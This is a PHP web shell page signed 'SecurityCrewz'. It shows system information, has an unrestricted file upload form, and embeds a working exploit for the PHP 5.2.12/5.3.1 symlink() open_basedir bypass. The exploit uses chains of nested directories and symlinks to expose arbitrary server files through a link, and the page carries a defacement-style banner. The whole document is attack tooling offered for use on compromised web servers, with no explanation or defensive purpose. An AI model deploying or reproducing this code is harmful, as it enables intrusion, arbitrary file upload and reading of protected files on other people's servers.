<title>
=SecurityCrewz=</title>
<center>
<center><font style="color:white;font size:8px;text-align: center;font-family:Pirata One;text-shadow: 0 0 10px #000000, 0px 0px 10px #000000,0 0 10px #000000,0 0 10px #000000;"><font face="Pirata One" color=red size=5>
<div class="dd-postmetadataheader"><h2 class="dd-postheader">
</title><font size="6" face="Narkisim" color="red">./Coded by SecurityCrewz
<body background="http://newflowerwallpaper.com/download/black-and-white-flower-images/black-and-white-flower-images-6.jpg">
<font size="4" face="Narkisim" color="Red">
<?php
echo '<b><br><br>'.php_uname().'<br></b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
 if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Uploaded Successfully</b><br><br>'; }
 else { echo '<b>Upload Failed! </b><br><br>'; }
}
?></p>
<?php
/*
PHP 5.2.12/5.3.1 symlink() open_basedir bypass 
by Maksymilian Arciemowicz http://securityreason.com/
cxib [ a.T] securityreason [ d0t] com

CHUJWAMWMUZG
*/

$fakedir="cx";
$fakedep=16;

$num=0; // offset of symlink.$num

if(!empty($_GET['file'])) $file=$_GET['file'];
else if(!empty($_POST['file'])) $file=$_POST['file'];
else $file="";

echo '<PRE><img src="http://oi60.tinypic.com/11bsqqg.jpg"><P>SecurityCrewz a.k.a aDikzAm
Bypass Symlink (Kill Them)
<br>No System Is Safe.
<br>.!.Tranquility Can Be Found When We Are With God.!.
<p><form name="form"
 action="http://'.$_SERVER["HTTP_HOST"].htmlspecialchars($_SERVER["PHP_SELF"]).'" method="post"><input type="text" name="file" size="50" value="'.htmlspecialchars($file).'"><input type="submit" name="hym" value="Kill xD"></form>';

if(empty($file))
	exit;

if(!is_writable("."))
	die("not writable directory");

$level=0;

for($as=0;$as<$fakedep;$as++){
	if(!file_exists($fakedir))
		mkdir($fakedir);
	chdir($fakedir);
}

while(1<$as--) chdir("..");

$hardstyle = explode("/", $file);

for($a=0;$a<count($hardstyle);$a++){
	if(!empty($hardstyle[$a])){
		if(!file_exists($hardstyle[$a])) 
			mkdir($hardstyle[$a]);
		chdir($hardstyle[$a]);
		$as++;
	}
}
$as++;
while($as--)
	chdir("..");

@rmdir("fakesymlink");
@unlink("fakesymlink");

@symlink(str_repeat($fakedir."/",$fakedep),"fakesymlink");

// this loop will skip allready SecCrewz.
while(1)
	if(true==(@symlink("fakesymlink/".str_repeat("../",$fakedep-1).$file, "SecCrewz".$num))) break;
	else $num++;

@unlink("fakesymlink");
mkdir("fakesymlink");

die('<FONT COLOR="RED">Bypass Done!!! <a href="./SecCrewz'.$num.'">SecCrewz'.$num.'</a> Hip-Hop HooRay</FONT>');

end
?>

